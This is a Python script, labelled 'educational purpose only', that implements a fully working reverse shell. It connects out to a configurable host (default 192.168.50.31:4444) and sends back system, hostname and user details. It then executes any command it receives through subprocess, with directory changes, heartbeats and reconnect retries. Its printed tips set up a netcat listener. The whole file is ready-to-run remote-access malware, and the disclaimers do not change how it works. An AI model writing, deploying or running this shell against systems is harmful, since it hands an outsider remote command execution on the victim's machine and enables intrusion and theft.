#!/usr/bin/env python3
# EDUCATIONAL PURPOSE ONLY
# This demonstrates how a reverse shell works for cybersecurity education
# Use only in controlled lab environments you own

import socket
import subprocess
import os
import sys
import time
import argparse
import platform
import getpass

def reverse_shell(host='192.168.50.31', port=4444, max_retries=5, retry_delay=5):
    # Create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Set socket timeout to prevent hanging
    s.settimeout(10)  # 10-second timeout for connection attempts
    
    # Connection attempts with retry
    connected = False
    retries = max_retries
    
    print("[*] Educational reverse shell attempting to connect to lab environment")
    print(f"[*] Target: {host}:{port}")
    print(f"[*] Make sure you have a listener running with: nc -lvnp {port}")
    
    # Give user time to set up listener if they haven't already
    print("[*] Waiting 5 seconds before first connection attempt...")
    time.sleep(5)
    
    while not connected and retries > 0:
        try:
            print(f"[*] Connecting to {host}:{port} (attempt {max_retries-retries+1}/{max_retries})")
            s.connect((host, port))
            connected = True
            print("[+] Connection established")
            
            # Enhanced system info upon connection
            try:
                system_info = f"\nSystem: {platform.system()} {platform.release()} | "
                system_info += f"Host: {socket.gethostname()} | "
                system_info += f"User: {getpass.getuser()} | "
                system_info += f"Python: {platform.python_version()} | "
                system_info += f"IP: {socket.gethostbyname(socket.gethostname())}\n"
            except Exception as e:
                system_info = f"\nSystem: {os.name} | Host: {socket.gethostname()} | User: {os.getlogin()}\n"
            
            s.send(system_info.encode())
            
            # Command execution loop with heartbeat
            last_heartbeat = time.time()
            
            while True:
                # Set socket to non-blocking temporarily to check for heartbeat
                s.setblocking(0)
                ready = True
                try:
                    time.sleep(0.1)
                    # Every 30 seconds, send heartbeat if no commands received
                    if time.time() - last_heartbeat > 30:
                        s.send(b"\x00")  # Null byte as heartbeat
                        last_heartbeat = time.time()
                except:
                    pass
                
                # Set back to blocking for command reception
                s.setblocking(1)
                
                # Receive command with proper error handling
                try:
                    command = s.recv(1024).decode('utf-8', errors='replace').strip()
                    last_heartbeat = time.time()
                    
                    if not command:  # Handle empty data (connection closed)
                        print("[-] Connection lost - empty data received")
                        break
                    
                    # Skip heartbeat bytes
                    if command == "\x00":
                        continue
                        
                    print(f"[*] Received command: {command}")
                    
                    # Special command handling
                    if command.lower() in ['exit', 'quit', 'bye']:
                        print("[*] Exit command received, closing connection")
                        s.send(b"Connection terminated by client\n")
                        break
                    
                    elif command.lower() == 'info':
                        # Send updated system info
                        try:
                            updated_info = f"System: {platform.system()} {platform.release()}\n"
                            updated_info += f"Architecture: {platform.machine()}\n"
                            updated_info += f"Hostname: {socket.gethostname()}\n"
                            updated_info += f"Username: {getpass.getuser()}\n"
                            updated_info += f"Current Directory: {os.getcwd()}\n"
                            updated_info += f"Python Version: {platform.python_version()}\n"
                            s.send(updated_info.encode() + b'\n')
                        except Exception as e:
                            s.send(f"Error getting system info: {str(e)}".encode() + b'\n')
                    
                    elif command.lower() == 'help':
                        help_text = "Available commands:\n"
                        help_text += "  help         - Show this help menu\n"
                        help_text += "  info         - Show detailed system information\n"
                        help_text += "  cd <dir>     - Change directory\n"
                        help_text += "  exit/quit    - Close the connection\n"
                        help_text += "  <any cmd>    - Execute command on target system\n"
                        s.send(help_text.encode() + b'\n')
                    
                    elif command.lower().startswith('cd '):
                        # Handle directory change
                        new_dir = command[3:].strip()
                        try:
                            os.chdir(new_dir)
                            s.send(f"Changed directory to: {os.getcwd()}".encode() + b'\n')
                        except Exception as e:
                            s.send(f"Error changing directory: {str(e)}".encode() + b'\n')
                    
                    else:
                        # Execute standard command
                        try:
                            output = subprocess.getoutput(command)
                            if not output:
                                output = "[No output]"
                            s.send(output.encode('utf-8', errors='replace') + b'\n')
                        except Exception as e:
                            error_msg = f"Error executing command: {str(e)}"
                            s.send(error_msg.encode('utf-8', errors='replace') + b'\n')
                
                except ConnectionError:
                    print("[-] Connection error during command execution")
                    break
                except Exception as e:
                    error_msg = f"Error executing command: {str(e)}"
                    print(f"[-] {error_msg}")
                    try:
                        s.send(error_msg.encode('utf-8', errors='replace') + b'\n')
                    except:
                        break
        
        except ConnectionRefusedError:
            print(f"[-] Connection refused: No listener active on {host}:{port}")
            print(f"[*] Start a listener with: nc -lvnp {port}")
            retries -= 1
            if retries > 0:
                print(f"[*] Retrying in {retry_delay} seconds...")
                time.sleep(retry_delay)
        except socket.timeout:
            print(f"[-] Connection timeout: Host {host} did not respond")
            print("[*] This usually means:")
            print("    - The IP address is incorrect or unreachable")
            print("    - A firewall is blocking the connection")
            print("    - The listener is not running on the specified port")
            retries -= 1
            if retries > 0:
                print(f"[*] Retrying in {retry_delay} seconds...")
                time.sleep(retry_delay)
        except socket.gaierror:
            print(f"[-] Address error: Could not resolve {host}")
            print("[*] Check that the IP address is correct")
            retries -= 1
            time.sleep(retry_delay)
        except Exception as e:
            print(f"[-] Connection failed: {str(e)}")
            retries -= 1
            time.sleep(retry_delay)
            
        finally:
            if not connected and retries <= 0:
                print("[-] Max connection attempts reached")
                print("[*] Troubleshooting tips:")
                print(f"    1. Ensure your listener is running: nc -lvnp {port}")
                print("    2. Check for firewall blocking connections")
                print("    3. Verify the IP address is correct")
                print("    4. Try a different port")
                print("    5. Check if your Linux device is reachable with: ping " + host)
                print("    6. Try using the actual IP address instead of 172.17.0.1")
                print("    7. For Docker containers, make sure port forwarding is configured")
    
    if connected:
        s.close()
    print("[*] Connection closed")

if __name__ == "__main__":
    print("[!] EDUCATIONAL EXAMPLE - Use only in your own lab environment")
    print("\n[!] IMPORTANT: Before running this script, you must set up a listener.")
    print("[!] Open a separate terminal/command prompt and run:")
    print("[!] On Windows: 'nc -lvnp 4444' (if netcat is installed)")
    print("[!] On Linux/Mac: 'nc -lvnp 4444'")
    print("[!] Or use the simple_python_listener.py script which is more reliable\n")
    
    # Ask user to confirm listener is running
    confirmation = input("[?] Have you set up a listener? (y/n): ")
    if confirmation.lower() != 'y':
        print("[!] Please set up a listener first and run this script again.")
        sys.exit(0)
    
    # Add command line argument support
    parser = argparse.ArgumentParser(description='Educational Reverse Shell for Cybersecurity Learning')
    parser.add_argument('-i', '--ip', default='192.168.50.31', 
                        help='IP address to connect to (default: 192.168.50.31)')
    parser.add_argument('-p', '--port', type=int, default=4444, 
                        help='Port to connect to (default: 4444)')
    parser.add_argument('-r', '--retries', type=int, default=5, 
                        help='Number of connection attempts (default: 5)')
    parser.add_argument('-d', '--delay', type=int, default=5, 
                        help='Delay between retries in seconds (default: 5)')
    parser.add_argument('-t', '--timeout', type=int, default=10,
                        help='Connection timeout in seconds (default: 10)')
    parser.add_argument('-s', '--shell', action='store_true',
                        help='Use system shell for command execution (cmd.exe or PowerShell)')
    
    args = parser.parse_args()
    
    # Print helpful tips for command execution
    print("\n[*] Connection Tips:")
    print("[*] 1. For help with available commands, type 'help' on the listener")
    print("[*] 2. To execute Windows commands, type them exactly as you would in cmd.exe")
    print("[*] 3. Some complex commands may require PowerShell - prefix with 'powershell -c'")
    print("[*] 4. To exit the session type 'exit' or 'quit'")
    
    # Print network information to help troubleshoot
    print("\n[*] Network information that might help:")
    try:
        print(f"[*] Your local hostname: {socket.gethostname()}")
        print(f"[*] Your local IP: {socket.gethostbyname(socket.gethostname())}")
        print("[*] Available network interfaces:")
        for interface in socket.getaddrinfo(socket.gethostname(), None):
            if interface[0] == socket.AF_INET:  # Only show IPv4
                print(f"    - {interface[4][0]}")
    except:
        print("[*] Could not determine network information")
    
    reverse_shell(host=args.ip, port=args.port, max_retries=args.retries, retry_delay=args.delay)
